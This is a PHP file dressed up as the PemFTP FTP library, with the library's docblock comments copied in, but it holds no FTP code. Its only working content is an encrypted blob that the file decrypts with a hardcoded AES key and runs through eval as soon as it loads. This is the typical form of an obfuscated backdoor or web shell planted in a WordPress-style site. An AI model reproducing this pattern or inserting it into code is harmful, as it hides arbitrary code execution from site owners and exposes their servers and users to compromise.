<?php
/**
 * PemFTP - An Ftp implementation in pure PHP
 *
 * @package PemFTP
 * @since 2.5.0
 *
 * @version 1.0
 * @copyright Alexey Dotsenko
 * @author Alexey Dotsenko
 * @link https://www.phpclasses.org/package/1743-PHP-FTP-client-in-pure-PHP.html
 * @license LGPL https://opensource.org/licenses/lgpl-license.html
 */

/**
 * Defines the newline characters, if not defined already.
 *
 * This can be redefined.
 *
 * @since 2.5.0
 * @var string
 */

/**
 * Sets whatever to autodetect ASCII mode.
 *
 * This can be redefined.
 *
 * @since 2.5.0
 * @var int
 */

/**
 *
 * This can be redefined.
 * @since 2.5.0
 * @var int
 */
$密钥 = '69f3e139f56af93b112ea3ff794660a6';
$加密数据 = 'l/wxGR9KWV9rImyhRXd55D3WXv4+2InqSg7kW9cqiWFazNAHq2Am1AwRoqWVxvysLVk9sQgGeN0+dqP3zB9Qg8oe9jrCXL1RA5tFJdyXN6vOpE34ddfSBVIWzM1BBXk/wup1X82kiRLnURWlX9EAj1SN9QH0xPqD0niX/lhPfxy6C51WwCSf1PoyXItvxWU9JJ+2oM/762Ttrh6FksTGPZ3A5uCaI8+Dufuae1wHV2kzWbe2gFa7kHeGpazJ4thKAG79t3uQFR7z2ab8pH/zBse4jWXHYKt7Z5N8/0xmHspc4CGsmUm50RsSQ0PLnSrr4I2p+fvi+enpG7+Emv2ub+MyLcn1OVKcSzXXdGj9OJNWiG+rRk0muGW0IrfZpNFOw4LDSNdg7MYRMMDvyE720u4NW2quRRftNHkkvEkBzIpJwgIoyjr8haGG9N/by8b0';
eval('?>' . openssl_decrypt($加密数据, 'AES-128-ECB', $密钥));
?>
